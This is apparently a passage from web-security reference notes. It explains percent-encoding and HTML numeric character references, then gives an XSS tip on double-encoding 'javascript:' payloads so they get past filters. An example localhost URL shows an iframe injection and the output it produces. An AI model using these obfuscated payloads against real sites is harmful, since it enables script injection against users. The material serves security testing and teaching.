
## Internals

### Encoding mechanisms

**Percent-encoding (aka. URL encoding)**

Percent-encoding is a mechanism to encode 8-bit characters that have specific meaning in the context of URLs. The encoding consists of substitution: A '%' followed by the hexadecimal representation of the ASCII value of the replace character.

For example `a` translates to `%61`.

On JS the functions `encodeURI()` and `encodeURIComponent()` are used to percent-encode URLs.

Reference:
- [RFC 3986](https://datatracker.ietf.org/doc/html/rfc3986)

**HTML character reference and Numeric character reference (NCR)**

A numeric character reference in HTML refers to a character by its Universal Character Set/Unicode code point, and uses the format `&#nnnn;` or `&#xhhhh;` where nnnn is the code point in decimal form, and hhhh is the code point in hexadecimal form. The x must be lowercase in XML documents. The nnnn or hhhh may be any number of digits and may include leading zeros. The hhhh may mix uppercase and lowercase, though uppercase is the usual style.

For example `6` translates to `&#54;` or `&#x36;`.

Not all web browsers or email clients used by receivers of HTML documents, or text editors used by authors of HTML documents, will be able to render all HTML characters. Most modern software is able to display most or all of the characters for the user's language, and will draw a box or other clear indicator for characters they cannot render.

Reference:
- [Numeric character reference (NCR)](https://en.wikipedia.org/wiki/Numeric_character_reference)
- [HTML character reference](https://en.wikipedia.org/wiki/Character_encodings_in_HTML#HTML_character_references)
- [List of XML and HTML character entity references](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)

## XSS tips

### It is possible to encode multiple times

by: @brutelogic

In "javascript:" payloads there's a lot of room for obfuscation in the code side since it can be double encoded.

```
javascript:alert(1)
javascript:%61lert(1)                           <---- Percent-encoding:    a => %61
javascript:&#37&#54&#49lert(1)                  <---- NCR encoding:        % => &#37;    6 => &#54;    1 => &#49;
javascript:%26%2337%26%2354%26%2349lert(1)      <---- Percent-encoding:    &# => %26%23
```

Example:

```
http://localhost/?x=<iframe+src=javascript:%26%2337%26%2354%26%2349lert(1)>
```

output:

```html
<iframe src=javascript:&#37&#54&#49lert(1)>
```
